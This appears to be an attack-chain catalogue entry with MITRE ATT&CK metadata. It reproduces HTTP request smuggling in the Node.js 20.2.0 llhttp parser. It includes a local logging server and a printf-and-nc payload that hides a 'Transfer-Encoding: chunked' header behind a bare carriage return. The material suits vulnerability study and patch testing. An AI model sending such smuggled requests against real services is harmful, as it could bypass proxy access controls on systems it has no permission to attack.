---
tags:
  - http-smuggling
  - node.js
  - vulnerability
  - parser-exploit
type: attack_chain
tools:
  - '[[tools/Node.js]]'
  - '[[tools/printf]]'
  - '[[tools/nc]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/setup-nodejs-server]]'
  - '[[commands/send-malformed-http-request]]'
platforms:
  - Web
  - Node.js
complexity: medium
procedures:
  - '[[procedures/Setup-Node.js-Test-Server]]'
  - '[[procedures/Send-Crafted-HTTP-Request]]'
  - '[[procedures/Observe-Parsed-Request-Output]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Exploitation of HTTP Request Smuggling vulnerability in Node.js llhttp parser
  by sending malformed headers to bypass access controls
skill_level: intermediate
impact_level: high
id: 13aebc8a-ee08-4a14-bc47-ef56ebfd1156
created_at: '2025-12-13T09:01:17.245Z'
updated_at: '2025-12-13T09:01:17.245Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# HTTP Request Smuggling in Node.js via llhttp Parser Misinterpretation

Multi-stage attack chain demonstrating how to exploit a vulnerability in the Node.js llhttp parser that allows HTTP Request Smuggling by accepting a single CR as a header delimiter, contrary to RFC7230. This can lead to smuggling attacks, potentially bypassing access controls in setups with frontend proxies.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Test Server] --> B[Send Crafted Request]
    B --> C[Observe Smuggling]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Node.js]]
- [[tools/printf]]
- [[tools/nc]]

### Target Environment

- Node.js version 20.2.0 with http module and llhttp parser
- Localhost setup with HTTP server on port 5000
- Web platform

### Initial Access Requirements

- Local network access to port 5000
- Ability to run Node.js scripts and shell commands
- No credentials required for local testing

## Detailed Attack Procedures

### Step 1: Setup Test Server
procedure: [[procedures/Setup-Node.js-Test-Server]]

**Objective**: Create a Node.js HTTP server to receive and log requests for vulnerability demonstration.

**Instructions**: Execute the server setup using [[commands/setup-nodejs-server]]:

```javascript
const http = require("http"); http.createServer((request, response) => { let body = []; request.on("error", (err) => { response.end("Request Error: " + err); }).on("data", (chunk) => { body.push(chunk); }).on("end", () => { body = Buffer.concat(body).toString(); console.log("Response"); console.log(request.headers); console.log(body); console.log("---"); response.on("error", (err) => { response.end("Response Error: " + err); }); response.end("Body length: " + body.length.toString() + " Body: " + body); }); }).listen(5000);
```

**Expected Output**: Server starts listening on port 5000 and is ready to log incoming requests.

**Success Indicators**:
- Server running without errors
- Port 5000 open locally

### Step 2: Send Crafted Request
procedure: [[procedures/Send-Crafted-HTTP-Request]]

**Objective**: Send a malformed HTTP request to exploit the parser's acceptance of CR as a delimiter, injecting a smuggling header.

**Instructions**: Use [[commands/send-malformed-http-request]] to send the payload:

```bash
printf "POST / HTTP/1.1\r\nHost: localhost:5000\r\nX-Abc:\rxTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n" | nc localhost 5000
```

**Expected Output**: The request is sent to the server, triggering the parsing vulnerability.

**Success Indicators**:
- Request successfully transmitted
- No connection errors

### Step 3: Observe Parsed Output
procedure: [[procedures/Observe-Parsed-Request-Output]]

**Objective**: Verify the smuggling by checking the server's logged interpretation of headers and body.

**Instructions**: Monitor the console output of the Node.js server for parsed headers showing 'transfer-encoding: chunked' and body as 'A'.

**Expected Output**: Logged headers: { host: 'localhost:5000', 'x-abc': '', 'transfer-encoding': 'chunked' } and body: 'A'.

**Success Indicators**:
- Headers misinterpreted as including 'transfer-encoding: chunked'
- Body parsed as chunked content

## Attack Chain Summary

### Key Achievements

1. Successful setup of vulnerable Node.js server
2. Injection of smuggling via malformed header
3. Verification of parser misinterpretation leading to potential access control bypass

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: [TIMESTAMP]*
